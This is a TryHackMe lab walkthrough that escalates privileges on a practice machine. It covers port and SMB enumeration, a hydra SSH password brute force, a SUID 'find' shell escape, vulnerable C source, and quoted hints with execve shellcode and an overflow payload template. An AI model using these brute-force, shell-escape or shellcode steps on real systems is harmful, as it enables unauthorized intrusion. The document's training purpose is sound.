---
Escalate your privileges by exploiting vulnerable binaries.
---

![](https://i.imgur.com/aohxmGa.jpg)

![222](https://tryhackme-images.s3.amazonaws.com/room-icons/2e7fc08002cc56de2f61e8e46365ae8f.png)

### Gain initial access

 Start Machine

![222](https://i.ibb.co/McrC2hN/Picture5.png)  

Enumerate the machine and get an interactive shell. Exploit an SUID bit file, use GNU debugger to take advantage of a buffer overflow and gain root access by PATH manipulation.

There are more points up for grabs in this room.

Answer the questions below

```rust

┌──(kali㉿kali)-[~/Downloads]
└─$ rustscan -a 10.10.248.150 --ulimit 5500 -b 65535 -- -A -Pn
.----. .-. .-. .----..---.  .----. .---.   .--.  .-. .-.
| {}  }| { } |{ {__ {_   _}{ {__  /  ___} / {} \ |  `| |
| .-. \| {_} |.-._} } | |  .-._} }\     }/  /\  \| |\  |
`-' `-'`-----'`----'  `-'  `----'  `---' `-'  `-'`-' `-'
The Modern Day Port Scanner.
________________________________________
: https://discord.gg/GFrQsGy           :
: https://github.com/RustScan/RustScan :
 --------------------------------------
🌍HACK THE PLANET🌍

[~] The config file is expected to be at "/home/kali/.rustscan.toml"
[~] Automatically increasing ulimit value to 5500.
[!] File limit is lower than default batch size. Consider upping with --ulimit. May cause harm to sensitive servers
Open 10.10.248.150:22
Open 10.10.248.150:139
Open 10.10.248.150:445
[~] Starting Script(s)
[>] Script to be run Some("nmap -vvv -p {{port}} {{ip}}")

Host discovery disabled (-Pn). All addresses will be marked 'up' and scan times may be slower.
[~] Starting Nmap 7.93 ( https://nmap.org ) at 2023-01-18 18:04 EST
NSE: Loaded 155 scripts for scanning.
NSE: Script Pre-scanning.
NSE: Starting runlevel 1 (of 3) scan.
Initiating NSE at 18:04
Completed NSE at 18:04, 0.00s elapsed
NSE: Starting runlevel 2 (of 3) scan.
Initiating NSE at 18:04
Completed NSE at 18:04, 0.00s elapsed
NSE: Starting runlevel 3 (of 3) scan.
Initiating NSE at 18:04
Completed NSE at 18:04, 0.00s elapsed
Initiating Parallel DNS resolution of 1 host. at 18:04
Completed Parallel DNS resolution of 1 host. at 18:04, 0.01s elapsed
DNS resolution of 1 IPs took 0.03s. Mode: Async [#: 1, OK: 0, NX: 1, DR: 0, SF: 0, TR: 1, CN: 0]
Initiating Connect Scan at 18:04
Scanning 10.10.248.150 [3 ports]
Discovered open port 22/tcp on 10.10.248.150
Discovered open port 139/tcp on 10.10.248.150
Discovered open port 445/tcp on 10.10.248.150
Completed Connect Scan at 18:04, 0.24s elapsed (3 total ports)
Initiating Service scan at 18:04
Scanning 3 services on 10.10.248.150
Completed Service scan at 18:04, 11.71s elapsed (3 services on 1 host)
NSE: Script scanning 10.10.248.150.
NSE: Starting runlevel 1 (of 3) scan.
Initiating NSE at 18:04
Completed NSE at 18:05, 6.09s elapsed
NSE: Starting runlevel 2 (of 3) scan.
Initiating NSE at 18:05
Completed NSE at 18:05, 0.03s elapsed
NSE: Starting runlevel 3 (of 3) scan.
Initiating NSE at 18:05
Completed NSE at 18:05, 0.00s elapsed
Nmap scan report for 10.10.248.150
Host is up, received user-set (0.23s latency).
Scanned at 2023-01-18 18:04:44 EST for 19s

PORT    STATE SERVICE     REASON  VERSION
22/tcp  open  ssh         syn-ack OpenSSH 7.6p1 Ubuntu 4ubuntu0.3 (Ubuntu Linux; protocol 2.0)
| ssh-hostkey: 
|   2048 3f36deda2fc3b7786fa925d641dd5469 (RSA)
| ssh-rsa AAAAB3NzaC1yc2EAAAADAQABAAABAQC3OBXYJUrPGglNoKPhUcwp3YiZRy6qNTHdOmGsgzy5ll+GDY8zkoIsNiqdHSaDKXvO+9ix+dZNF9CtgRDrLhL6j2Bn4RI011xveUiTF6LO7PEsv5RYI7KueOXyaw8vahdf/CdV4RQXhefge6FIZqkvhDGQsid8F3e846kJ7FPZYAcwQ5Iapv9ae1+23OZcDLtdTDlQOZIyNaVmPu0XVjHYnvHsC5r/eX/wq9WzETDVzgANMwsWOeZmjH956z4hjL7K91KHeaMnRHeO/tln1Pk9EG1eGn4FHsD1/LdumWp0pHDUXwTJ7OwuuucnzuiLrx8jDr03bEu4kPKpkB0Bc1Kb
|   256 d07823eef37158aee9571417bbe36aae (ECDSA)
| ecdsa-sha2-nistp256 AAAAE2VjZHNhLXNoYTItbmlzdHAyNTYAAAAIbmlzdHAyNTYAAABBBJlazDOaT1mvebWCf/KbUSzgt3MCueCjEYz6Uf6tDyYG5H7HsVTbKbphLPJupB3gght1wmk+8BpQe8q4fa+1ZXQ=
|   256 4cdef149df214f32cae68ebc6a9653e5 (ED25519)
|_ssh-ed25519 AAAAC3NzaC1lZDI1NTE5AAAAIIdOXbBN4ecgx8K412W8m2fd7R6y7c0O9uXXFv+gLusY
139/tcp open  netbios-ssn syn-ack Samba smbd 3.X - 4.X (workgroup: WORKGROUP)
445/tcp open  netbios-ssn syn-ack Samba smbd 4.7.6-Ubuntu (workgroup: WORKGROUP)
Service Info: Host: THM_EXPLOIT; OS: Linux; CPE: cpe:/o:linux:linux_kernel

Host script results:
| smb2-time: 
|   date: 2023-01-18T23:04:57
|_  start_date: N/A
| smb-security-mode: 
|   account_used: guest
|   authentication_level: user
|   challenge_response: supported
|_  message_signing: disabled (dangerous, but default)
|_clock-skew: mean: 0s, deviation: 1s, median: 0s
| p2p-conficker: 
|   Checking for Conficker.C or higher...
|   Check 1 (port 6830/tcp): CLEAN (Couldn't connect)
|   Check 2 (port 15281/tcp): CLEAN (Couldn't connect)
|   Check 3 (port 59030/udp): CLEAN (Failed to receive data)
|   Check 4 (port 48047/udp): CLEAN (Failed to receive data)
|_  0/4 checks are positive: Host is CLEAN or ports are blocked
| smb2-security-mode: 
|   311: 
|_    Message signing enabled but not required
| nbstat: NetBIOS name: THM_EXPLOIT, NetBIOS user: <unknown>, NetBIOS MAC: 000000000000 (Xerox)
| Names:
|   THM_EXPLOIT<00>      Flags: <unique><active>
|   THM_EXPLOIT<03>      Flags: <unique><active>
|   THM_EXPLOIT<20>      Flags: <unique><active>
|   \x01\x02__MSBROWSE__\x02<01>  Flags: <group><active>
|   WORKGROUP<00>        Flags: <group><active>
|   WORKGROUP<1d>        Flags: <unique><active>
|   WORKGROUP<1e>        Flags: <group><active>
| Statistics:
|   0000000000000000000000000000000000
|   0000000000000000000000000000000000
|_  0000000000000000000000000000
| smb-os-discovery: 
|   OS: Windows 6.1 (Samba 4.7.6-Ubuntu)
|   Computer name: thm_exploit
|   NetBIOS computer name: THM_EXPLOIT\x00
|   Domain name: \x00
|   FQDN: thm_exploit
|_  System time: 2023-01-18T23:04:57+00:00

NSE: Script Post-scanning.
NSE: Starting runlevel 1 (of 3) scan.
Initiating NSE at 18:05
Completed NSE at 18:05, 0.00s elapsed
NSE: Starting runlevel 2 (of 3) scan.
Initiating NSE at 18:05
Completed NSE at 18:05, 0.00s elapsed
NSE: Starting runlevel 3 (of 3) scan.
Initiating NSE at 18:05
Completed NSE at 18:05, 0.00s elapsed
Read data files from: /usr/bin/../share/nmap
Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
Nmap done: 1 IP address (1 host up) scanned in 21.18 seconds

┌──(kali㉿kali)-[~/hackthebox]
└─$ smbclient -N -L 10.10.248.150

	Sharename       Type      Comment
	---------       ----      -------
	print$          Disk      Printer Drivers
	IPC$            IPC       IPC Service (THM_exploit server (Samba, Ubuntu))
Reconnecting with SMB1 for workgroup listing.

	Server               Comment
	---------            -------

	Workgroup            Master
	---------            -------
	WORKGROUP            THM_EXPLOIT

┌──(kali㉿kali)-[~/hackthebox]
└─$ smbmap -u anonymous -H 10.10.248.150           
[+] Guest session   	IP: 10.10.248.150:445	Name: 10.10.248.150                                     
        Disk                                                  	Permissions	Comment
	----                                                  	-----------	-------
	print$                                            	NO ACCESS	Printer Drivers
	IPC$                                              	NO ACCESS	IPC Service (THM_exploit server (Samba, Ubuntu))

┌──(root㉿kali)-[/home/kali/hackthebox]
└─# python3 /usr/share/doc/python3-impacket/examples/lookupsid.py anonymous@10.10.248.150              
Impacket v0.9.24.dev1+20210704.162046.29ad5792 - Copyright 2021 SecureAuth Corporation

Password:
[*] Brute forcing SIDs at 10.10.248.150
[*] StringBinding ncacn_np:10.10.248.150[\pipe\lsarpc]
[-] nca_s_op_rng_error

-┌──(kali㉿kali)-[~/hackthebox]
└─$ enum4linux -a -u "guest" -p "" 10.10.248.150     
Starting enum4linux v0.9.1 ( http://labs.portcullis.co.uk/application/enum4linux/ ) on Wed Jan 18 18:37:15 2023

 =========================================( Target Information )=========================================

Target ........... 10.10.248.150
RID Range ........ 500-550,1000-1050
Username ......... 'guest'
Password ......... ''
Known Usernames .. administrator, guest, krbtgt, domain admins, root, bin, none


 ===========================( Enumerating Workgroup/Domain on 10.10.248.150 )===========================


[+] Got domain/workgroup name: WORKGROUP


 ===============================( Nbtstat Information for 10.10.248.150 )===============================

Looking up status of 10.10.248.150
	THM_EXPLOIT     <00> -         B <ACTIVE>  Workstation Service
	THM_EXPLOIT     <03> -         B <ACTIVE>  Messenger Service
	THM_EXPLOIT     <20> -         B <ACTIVE>  File Server Service
	..__MSBROWSE__. <01> - <GROUP> B <ACTIVE>  Master Browser
	WORKGROUP       <00> - <GROUP> B <ACTIVE>  Domain/Workgroup Name
	WORKGROUP       <1d> -         B <ACTIVE>  Master Browser
	WORKGROUP       <1e> - <GROUP> B <ACTIVE>  Browser Service Elections

	MAC Address = 00-00-00-00-00-00

 ===================================( Session Check on 10.10.248.150 )===================================


[+] Server 10.10.248.150 allows sessions using username 'guest', password ''


 ================================( Getting domain SID for 10.10.248.150 )================================

Bad SMB2 (sign_algo_id=1) signature for message
[0000] 00 00 00 00 00 00 00 00   00 00 00 00 00 00 00 00   ........ ........
[0000] 37 D8 6D C8 84 C2 5E 58   78 62 8B DD B0 96 33 8E   7.m...^X xb....3.
Cannot connect to server.  Error was NT_STATUS_ACCESS_DENIED

[+] Can't determine if host is part of domain or part of a workgroup


 ==================================( OS information on 10.10.248.150 )==================================


[E] Can't get OS info with smbclient


[+] Got OS info for 10.10.248.150 from srvinfo: 
Bad SMB2 (sign_algo_id=1) signature for message
[0000] 00 00 00 00 00 00 00 00   00 00 00 00 00 00 00 00   ........ ........
[0000] 27 98 A4 F7 05 56 3E D2   0E A0 76 CC B3 19 93 A0   '....V>. ..v.....
Cannot connect to server.  Error was NT_STATUS_ACCESS_DENIED


 =======================================( Users on 10.10.248.150 )=======================================


[E] Couldn't find users using querydispinfo: NT_STATUS_ACCESS_DENIED



[E] Couldn't find users using enumdomusers: NT_STATUS_ACCESS_DENIED


 =================================( Share Enumeration on 10.10.248.150 )=================================


	Sharename       Type      Comment
	---------       ----      -------
	print$          Disk      Printer Drivers
	IPC$            IPC       IPC Service (THM_exploit server (Samba, Ubuntu))
Reconnecting with SMB1 for workgroup listing.

	Server               Comment
	---------            -------

	Workgroup            Master
	---------            -------
	WORKGROUP            THM_EXPLOIT

[+] Attempting to map shares on 10.10.248.150

//10.10.248.150/print$	Mapping: DENIED Listing: N/A Writing: N/A

[E] Can't understand response:

NT_STATUS_OBJECT_NAME_NOT_FOUND listing \*
//10.10.248.150/IPC$	Mapping: N/A Listing: N/A Writing: N/A

 ===========================( Password Policy Information for 10.10.248.150 )===========================



[+] Attaching to 10.10.248.150 using guest

[+] Trying protocol 139/SMB...

[+] Found domain(s):

	[+] THM_EXPLOIT
	[+] Builtin

[+] Password Info for Domain: THM_EXPLOIT

	[+] Minimum password length: 5
	[+] Password history length: None
	[+] Maximum password age: 37 days 6 hours 21 minutes 
	[+] Password Complexity Flags: 000000

		[+] Domain Refuse Password Change: 0
		[+] Domain Password Store Cleartext: 0
		[+] Domain Password Lockout Admins: 0
		[+] Domain Password No Clear Change: 0
		[+] Domain Password No Anon Change: 0
		[+] Domain Password Complex: 0

	[+] Minimum password age: None
	[+] Reset Account Lockout Counter: 30 minutes 
	[+] Locked Account Duration: 30 minutes 
	[+] Account Lockout Threshold: None
	[+] Forced Log off Time: 37 days 6 hours 21 minutes 



[E] Failed to get password policy with rpcclient



 ======================================( Groups on 10.10.248.150 )======================================


[+] Getting builtin groups:


[+]  Getting builtin group memberships:


[+]  Getting local groups:


[+]  Getting local group memberships:


[+]  Getting domain groups:


[+]  Getting domain group memberships:


 ==================( Users on 10.10.248.150 via RID cycling (RIDS: 500-550,1000-1050) )==================


[E] Couldn't get SID: NT_STATUS_ACCESS_DENIED.  RID cycling not possible.


 ===============================( Getting printer info for 10.10.248.150 )===============================

Bad SMB2 (sign_algo_id=1) signature for message
[0000] 00 00 00 00 00 00 00 00   00 00 00 00 00 00 00 00   ........ ........
[0000] 7F 3D 16 73 86 C9 88 AC   51 E7 A2 99 10 6F 24 05   .=.s.... Q....o$.
Cannot connect to server.  Error was NT_STATUS_ACCESS_DENIED


enum4linux complete on Wed Jan 18 18:37:58 2023


┌──(kali㉿kali)-[~/hackthebox]
└─$ enum4linux -a 10.10.248.150   
Starting enum4linux v0.9.1 ( http://labs.portcullis.co.uk/application/enum4linux/ ) on Wed Jan 18 18:38:25 2023

 =========================================( Target Information )=========================================

Target ........... 10.10.248.150
RID Range ........ 500-550,1000-1050
Username ......... ''
Password ......... ''
Known Usernames .. administrator, guest, krbtgt, domain admins, root, bin, none


 ===========================( Enumerating Workgroup/Domain on 10.10.248.150 )===========================


[+] Got domain/workgroup name: WORKGROUP


 ===============================( Nbtstat Information for 10.10.248.150 )===============================

Looking up status of 10.10.248.150
	THM_EXPLOIT     <00> -         B <ACTIVE>  Workstation Service
	THM_EXPLOIT     <03> -         B <ACTIVE>  Messenger Service
	THM_EXPLOIT     <20> -         B <ACTIVE>  File Server Service
	..__MSBROWSE__. <01> - <GROUP> B <ACTIVE>  Master Browser
	WORKGROUP       <00> - <GROUP> B <ACTIVE>  Domain/Workgroup Name
	WORKGROUP       <1d> -         B <ACTIVE>  Master Browser
	WORKGROUP       <1e> - <GROUP> B <ACTIVE>  Browser Service Elections

	MAC Address = 00-00-00-00-00-00

 ===================================( Session Check on 10.10.248.150 )===================================


[+] Server 10.10.248.150 allows sessions using username '', password ''


 ================================( Getting domain SID for 10.10.248.150 )================================

Domain Name: WORKGROUP
Domain Sid: (NULL SID)

[+] Can't determine if host is part of domain or part of a workgroup


 ==================================( OS information on 10.10.248.150 )==================================


[E] Can't get OS info with smbclient


[+] Got OS info for 10.10.248.150 from srvinfo: 
	THM_EXPLOIT    Wk Sv PrQ Unx NT SNT THM_exploit server (Samba, Ubuntu)
	platform_id     :	500
	os version      :	6.1
	server type     :	0x809a03


 =======================================( Users on 10.10.248.150 )=======================================

Use of uninitialized value $users in print at ./enum4linux.pl line 972.
Use of uninitialized value $users in pattern match (m//) at ./enum4linux.pl line 975.

Use of uninitialized value $users in print at ./enum4linux.pl line 986.
Use of uninitialized value $users in pattern match (m//) at ./enum4linux.pl line 988.

 =================================( Share Enumeration on 10.10.248.150 )=================================


	Sharename       Type      Comment
	---------       ----      -------
	print$          Disk      Printer Drivers
	IPC$            IPC       IPC Service (THM_exploit server (Samba, Ubuntu))
Reconnecting with SMB1 for workgroup listing.

	Server               Comment
	---------            -------

	Workgroup            Master
	---------            -------
	WORKGROUP            THM_EXPLOIT

[+] Attempting to map shares on 10.10.248.150

//10.10.248.150/print$	Mapping: DENIED Listing: N/A Writing: N/A

[E] Can't understand response:

NT_STATUS_OBJECT_NAME_NOT_FOUND listing \*
//10.10.248.150/IPC$	Mapping: N/A Listing: N/A Writing: N/A

 ===========================( Password Policy Information for 10.10.248.150 )===========================



[+] Attaching to 10.10.248.150 using a NULL share

[+] Trying protocol 139/SMB...

[+] Found domain(s):

	[+] THM_EXPLOIT
	[+] Builtin

[+] Password Info for Domain: THM_EXPLOIT

	[+] Minimum password length: 5
	[+] Password history length: None
	[+] Maximum password age: 37 days 6 hours 21 minutes 
	[+] Password Complexity Flags: 000000

		[+] Domain Refuse Password Change: 0
		[+] Domain Password Store Cleartext: 0
		[+] Domain Password Lockout Admins: 0
		[+] Domain Password No Clear Change: 0
		[+] Domain Password No Anon Change: 0
		[+] Domain Password Complex: 0

	[+] Minimum password age: None
	[+] Reset Account Lockout Counter: 30 minutes 
	[+] Locked Account Duration: 30 minutes 
	[+] Account Lockout Threshold: None
	[+] Forced Log off Time: 37 days 6 hours 21 minutes 



[+] Retieved partial password policy with rpcclient:


Password Complexity: Disabled
Minimum Password Length: 5


 ======================================( Groups on 10.10.248.150 )======================================


[+] Getting builtin groups:


[+]  Getting builtin group memberships:


[+]  Getting local groups:


[+]  Getting local group memberships:


[+]  Getting domain groups:


[+]  Getting domain group memberships:


 ==================( Users on 10.10.248.150 via RID cycling (RIDS: 500-550,1000-1050) )==================


[I] Found new SID: 
S-1-22-1

[I] Found new SID: 
S-1-5-32

[I] Found new SID: 
S-1-5-32

[I] Found new SID: 
S-1-5-32

[I] Found new SID: 
S-1-5-32

[+] Enumerating users using SID S-1-5-21-2007993849-1719925537-2372789573 and logon username '', password ''

S-1-5-21-2007993849-1719925537-2372789573-501 THM_EXPLOIT\nobody (Local User)
S-1-5-21-2007993849-1719925537-2372789573-513 THM_EXPLOIT\None (Domain Group)

[+] Enumerating users using SID S-1-22-1 and logon username '', password ''

S-1-22-1-1000 Unix User\kel (Local User)
S-1-22-1-1001 Unix User\des (Local User)
S-1-22-1-1002 Unix User\tryhackme (Local User)
S-1-22-1-1003 Unix User\noentry (Local User)

[+] Enumerating users using SID S-1-5-32 and logon username '', password ''

S-1-5-32-544 BUILTIN\Administrators (Local Group)
S-1-5-32-545 BUILTIN\Users (Local Group)
S-1-5-32-546 BUILTIN\Guests (Local Group)
S-1-5-32-547 BUILTIN\Power Users (Local Group)
S-1-5-32-548 BUILTIN\Account Operators (Local Group)
S-1-5-32-549 BUILTIN\Server Operators (Local Group)
S-1-5-32-550 BUILTIN\Print Operators (Local Group)

 ===============================( Getting printer info for 10.10.248.150 )===============================

No printers returned.


enum4linux complete on Wed Jan 18 19:00:22 2023


tryhackme

┌──(kali㉿kali)-[~/hackthebox]
└─$ hydra -l tryhackme -P /usr/share/wordlists/rockyou.txt 10.10.248.150 ssh -V -t 64
Hydra v9.4 (c) 2022 by van Hauser/THC & David Maciejak - Please do not use in military or secret service organizations, or for illegal purposes (this is non-binding, these *** ignore laws and ethics anyway).

Hydra (https://github.com/vanhauser-thc/thc-hydra) starting at 2023-01-18 19:01:23
[WARNING] Many SSH configurations limit the number of parallel tasks, it is recommended to reduce the tasks: use -t 4
[DATA] max 64 tasks per 1 server, overall 64 tasks, 14344399 login tries (l:1/p:14344399), ~224132 tries per task
[DATA] attacking ssh://10.10.248.150:22/
[ATTEMPT] target 10.10.248.150 - login "tryhackme" - pass "jesucristo" - 848 of 14344436 [child 17] (0/37)
[ATTEMPT] target 10.10.248.150 - login "tryhackme" - pass "peewee" - 849 of 14344436 [child 18] (0/37)
[ATTEMPT] target 10.10.248.150 - login "tryhackme" - pass "paloma" - 850 of 14344436 [child 22] (0/37)
[ATTEMPT] target 10.10.248.150 - login "tryhackme" - pass "buddy1" - 851 of 14344436 [child 23] (0/37)
[ATTEMPT] target 10.10.248.150 - login "tryhackme" - pass "deedee" - 852 of 14344436 [child 32] (0/37)
[ATTEMPT] target 10.10.248.150 - login "tryhackme" - pass "miriam" - 853 of 14344436 [child 34] (0/37)
[ATTEMPT] target 10.10.248.150 - login "tryhackme" - pass "april" - 854 of 14344436 [child 36] (0/37)
[ATTEMPT] target 10.10.248.150 - login "tryhackme" - pass "patches" - 855 of 14344436 [child 37] (0/37)
[ATTEMPT] target 10.10.248.150 - login "tryhackme" - pass "regina" - 856 of 14344436 [child 39] (0/37)
[ATTEMPT] target 10.10.248.150 - login "tryhackme" - pass "janice" - 857 of 14344436 [child 50] (0/37)
[ATTEMPT] target 10.10.248.150 - login "tryhackme" - pass "cowboys" - 858 of 14344436 [child 54] (0/37)
[ATTEMPT] target 10.10.248.150 - login "tryhackme" - pass "myself" - 859 of 14344436 [child 58] (0/37)
[ATTEMPT] target 10.10.248.150 - login "tryhackme" - pass "lipgloss" - 860 of 14344436 [child 59] (0/37)
[ATTEMPT] target 10.10.248.150 - login "tryhackme" - pass "jazmin" - 861 of 14344436 [child 61] (0/37)
[ATTEMPT] target 10.10.248.150 - login "tryhackme" - pass "rosita" - 862 of 14344436 [child 63] (0/37)
[ATTEMPT] target 10.10.248.150 - login "tryhackme" - pass "happy1" - 863 of 14344436 [child 7] (0/37)
[22][ssh] host: 10.10.248.150   login: tryhackme   password: thebest
1 of 1 target successfully completed, 1 valid password found
[WARNING] Writing restore file because 26 final worker threads did not complete until end.
[ERROR] 26 targets did not resolve or could not be connected
[ERROR] 0 target did not complete
Hydra (https://github.com/vanhauser-thc/thc-hydra) finished at 2023-01-18 19:05:05

ssh
tryhackme:thebest



```

What are the login credential for initial access.

Answer format should be in **username:password**

Hint 1: RID range 1000-1003 Hint 2: The longest username has the unsecure password.

*tryhackme:thebest*

### SUID :: Binary 1

Read the flag.txt from des's home directory.  

Answer the questions below

```bash
┌──(kali㉿kali)-[~/hackthebox]
└─$ ssh tryhackme@10.10.248.150         
The authenticity of host '10.10.248.150 (10.10.248.150)' can't be established.
ED25519 key fingerprint is SHA256:uYXD5exaqJ26dg+cKFTWylivPmAYK+5Eo9B2ur/LtBc.
This key is not known by any other names.
Are you sure you want to continue connecting (yes/no/[fingerprint])? yes
Warning: Permanently added '10.10.248.150' (ED25519) to the list of known hosts.
tryhackme@10.10.248.150's password: 
Welcome to Ubuntu 18.04.3 LTS (GNU/Linux 4.15.0-74-generic x86_64)

 * Documentation:  https://help.ubuntu.com
 * Management:     https://landscape.canonical.com
 * Support:        https://ubuntu.com/advantage

  System information as of Thu Jan 19 00:25:45 UTC 2023

  System load:  0.0                Processes:           92
  Usage of /:   21.9% of 19.56GB   Users logged in:     0
  Memory usage: 16%                IP address for eth0: 10.10.248.150
  Swap usage:   0%


 * Canonical Livepatch is available for installation.
   - Reduce system reboots and improve kernel security. Activate at:
     https://ubuntu.com/livepatch

59 packages can be updated.
0 updates are security updates.

Failed to connect to https://changelogs.ubuntu.com/meta-release-lts. Check your Internet connection or proxy settings


Last login: Fri Jan 17 13:24:24 2020 from 192.168.247.130

tryhackme@THM_exploit:~$ find / -perm -4000 2>/dev/null | xargs ls -lah
ls: cannot access '/home/des/bof': Permission denied
-rwsr-xr-x 1 root   root             31K Aug 11  2016 /bin/fusermount
-rwsr-xr-x 1 root   root             43K Oct 15  2018 /bin/mount
-rwsr-xr-x 1 root   root             63K Jun 28  2019 /bin/ping
-rwsr-xr-x 1 root   root             44K Mar 22  2019 /bin/su
-rwsr-xr-x 1 root   root             27K Oct 15  2018 /bin/umount
-rwsr-xr-x 1 root   root             40K May 15  2019 /snap/core/7270/bin/mount
-rwsr-xr-x 1 root   root             44K May  7  2014 /snap/core/7270/bin/ping
-rwsr-xr-x 1 root   root             44K May  7  2014 /snap/core/7270/bin/ping6
-rwsr-xr-x 1 root   root             40K Mar 25  2019 /snap/core/7270/bin/su
-rwsr-xr-x 1 root   root             27K May 15  2019 /snap/core/7270/bin/umount
-rwsr-xr-x 1 root   root             71K Mar 25  2019 /snap/core/7270/usr/bin/chfn
-rwsr-xr-x 1 root   root             40K Mar 25  2019 /snap/core/7270/usr/bin/chsh
-rwsr-xr-x 1 root   root             74K Mar 25  2019 /snap/core/7270/usr/bin/gpasswd
-rwsr-xr-x 1 root   root             39K Mar 25  2019 /snap/core/7270/usr/bin/newgrp
-rwsr-xr-x 1 root   root             53K Mar 25  2019 /snap/core/7270/usr/bin/passwd
-rwsr-xr-x 1 root   root            134K Jun 10  2019 /snap/core/7270/usr/bin/sudo
-rwsr-xr-- 1 root   systemd-resolve  42K Jun 10  2019 /snap/core/7270/usr/lib/dbus-1.0/dbus-daemon-launch-helper
-rwsr-xr-x 1 root   root            419K Mar  4  2019 /snap/core/7270/usr/lib/openssh/ssh-keysign
-rwsr-sr-x 1 root   root            101K Jun 21  2019 /snap/core/7270/usr/lib/snapd/snap-confine
-rwsr-xr-- 1 root   dip             386K Jun 12  2018 /snap/core/7270/usr/sbin/pppd
-rwsr-xr-x 1 root   root             40K Oct 10  2019 /snap/core/8268/bin/mount
-rwsr-xr-x 1 root   root             44K May  7  2014 /snap/core/8268/bin/ping
-rwsr-xr-x 1 root   root             44K May  7  2014 /snap/core/8268/bin/ping6
-rwsr-xr-x 1 root   root             40K Mar 25  2019 /snap/core/8268/bin/su
-rwsr-xr-x 1 root   root             27K Oct 10  2019 /snap/core/8268/bin/umount
-rwsr-xr-x 1 root   root             71K Mar 25  2019 /snap/core/8268/usr/bin/chfn
-rwsr-xr-x 1 root   root             40K Mar 25  2019 /snap/core/8268/usr/bin/chsh
-rwsr-xr-x 1 root   root             74K Mar 25  2019 /snap/core/8268/usr/bin/gpasswd
-rwsr-xr-x 1 root   root             39K Mar 25  2019 /snap/core/8268/usr/bin/newgrp
-rwsr-xr-x 1 root   root             53K Mar 25  2019 /snap/core/8268/usr/bin/passwd
-rwsr-xr-x 1 root   root            134K Oct 11  2019 /snap/core/8268/usr/bin/sudo
-rwsr-xr-- 1 root   systemd-resolve  42K Jun 10  2019 /snap/core/8268/usr/lib/dbus-1.0/dbus-daemon-launch-helper
-rwsr-xr-x 1 root   root            419K Mar  4  2019 /snap/core/8268/usr/lib/openssh/ssh-keysign
-rwsr-sr-x 1 root   root            105K Dec  6  2019 /snap/core/8268/usr/lib/snapd/snap-confine
-rwsr-xr-- 1 root   dip             386K Jun 12  2018 /snap/core/8268/usr/sbin/pppd
-rwsr-sr-x 1 daemon daemon           51K Feb 20  2018 /usr/bin/at
-rwsr-xr-x 1 root   root             75K Mar 22  2019 /usr/bin/chfn
-rwsr-xr-x 1 root   root             44K Mar 22  2019 /usr/bin/chsh
-rwsr-sr-x 1 des    des             233K Nov  5  2017 /usr/bin/find
-rwsr-xr-x 1 root   root             75K Mar 22  2019 /usr/bin/gpasswd
-rwsr-xr-x 1 root   root             37K Mar 22  2019 /usr/bin/newgidmap
-rwsr-xr-x 1 root   root             40K Mar 22  2019 /usr/bin/newgrp
-rwsr-xr-x 1 root   root             37K Mar 22  2019 /usr/bin/newuidmap
-rwsr-xr-x 1 root   root             59K Mar 22  2019 /usr/bin/passwd
-rwsr-xr-x 1 root   root             22K Mar 27  2019 /usr/bin/pkexec
-rwsr-xr-x 1 root   root            146K Oct 10  2019 /usr/bin/sudo
-rwsr-xr-x 1 root   root             19K Jun 28  2019 /usr/bin/traceroute6.iputils
-rwsr-xr-- 1 root   messagebus       42K Jun 10  2019 /usr/lib/dbus-1.0/dbus-daemon-launch-helper
-rwsr-xr-x 1 root   root             10K Mar 28  2017 /usr/lib/eject/dmcrypt-get-device
-rwsr-xr-x 1 root   root            427K Mar  4  2019 /usr/lib/openssh/ssh-keysign
-rwsr-xr-x 1 root   root             14K Mar 27  2019 /usr/lib/policykit-1/polkit-agent-helper-1
-rwsr-sr-x 1 root   root            103K Jun  5  2019 /usr/lib/snapd/snap-confine
-rwsr-xr-x 1 root   root             99K Nov 23  2018 /usr/lib/x86_64-linux-gnu/lxc/lxc-user-nic

Horizontal escalation

tryhackme@THM_exploit:~$ find . -exec /bin/sh -p \; -quit
$ whoami
des
$ cd /home/des
$ ls
bof  bof64.c  flag.txt
$ cat flag.txt
Good job on exploiting the SUID file. Never assign +s to any system executable files. Remember, Check gtfobins.

You flag is THM{exploit_the_SUID}

login crdential (In case you need it)
username: des
password: destructive_72656275696c64
$ cat bof64.c
#include <stdio.h>
#include <unistd.h>

int foo(){
	char buffer[600];
	int characters_read;
	printf("Enter some string:\n");
	characters_read = read(0, buffer, 1000);
	printf("You entered: %s", buffer);
	return 0;
}

void main(){
	setresuid(geteuid(), geteuid(), geteuid());
    	setresgid(getegid(), getegid(), getegid());

	foo();
}
$ ls -lah
total 52K
drwx------ 4 des  des  4.0K Jan 17  2020 .
drwxr-xr-x 6 root root 4.0K Jan 17  2020 ..
-rw------- 1 root root 1.7K Jan 12  2020 .bash_history
-rw-r--r-- 1 des  des   220 Apr  4  2018 .bash_logout
-rw-r--r-- 1 des  des  3.7K Apr  4  2018 .bashrc
-rwsr-xr-x 1 kel  kel  8.4K Jan 17  2020 bof
-rw-r--r-- 1 root root  335 Jan 17  2020 bof64.c
drwx------ 2 des  des  4.0K Jan 12  2020 .cache
-r-x------ 1 des  des   237 Jan 17  2020 flag.txt
drwx------ 3 des  des  4.0K Jan 12  2020 .gnupg
-rw-r--r-- 1 des  des   807 Apr  4  2018 .profile

kel (horizontal escalation)

ssh

des:destructive_72656275696c64

```


**[+100 Points]** What is the contents of /home/des/flag.txt?

File permission is all you need.. Setuid...

*THM{exploit_the_SUID}*

### Buffer Overflow :: Binary 2

Read the flag.txt from kel's home directory.

If you are stuck, here are the hints for the exploit.

**Hint 1: Step to overflow 64-bits buffer**

**Step 1**: Generate a pattern, copy and paste this as input to the binary (use pattern_create.rb from

Metasploit)

**

**Step 2**: Read and copy the value from register RBP for the offset.

****

**Step 3**: Calculate the offset. (use pattern_offset.rb from Metasploit)

****

**Step 4**: Try control the register RIP with the following payload

**

Junk*(offset value) + 8 bytes of dummy  

**Step 5**: Read the stack or register RSP to find a suitable return address.

**

**Step 6**: The general payload should be like below

**

Nop + shellcode + Junks + return address

  

**Hint 2: Working shellcode**

  
`\x50\x48\x31\xd2\x48\x31\xf6\x48\xbb\x2f\x62\x69\x6e\x2f\x2f\x73\x68\x53\x54\x5f\xb0\x3b\x0f\x05`

**Hint 3: Running the payload with the binary**

  
`(python -c "print('\x90'*(fill in the number) + (shellcode) + 'A'*(fill in the number)`

`+(return address))";cat) | ./bof64`

For your information, the Gnu debugger or gdb is installed with the machine. Happy hunting!  

Answer the questions below

```yml

┌──(kali㉿kali)-[~/Downloads]
